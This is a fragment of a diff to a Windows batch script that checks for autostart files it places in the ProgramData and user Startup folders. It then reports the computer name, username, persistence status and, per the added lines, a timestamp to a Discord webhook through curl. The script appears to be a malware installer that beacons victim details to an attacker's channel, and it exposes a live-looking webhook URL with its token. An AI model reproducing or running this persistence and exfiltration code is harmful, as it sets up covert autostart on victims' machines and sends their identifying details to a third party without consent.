@@ -38,8 +38,13 @@ if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Micros
 set pcauto=NO, NOT CREATED
 )
 
+for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
+set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
+set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
+set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%
 
-set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%
+
+set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\nTIME: %time%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1046074645612335154/cqFXfvKa33ETOYQEiyJWJP_RhPFciwxl7qcEcFzsbFYd4mh5Xqah3yfBg54a50Jh7MFH
 
 
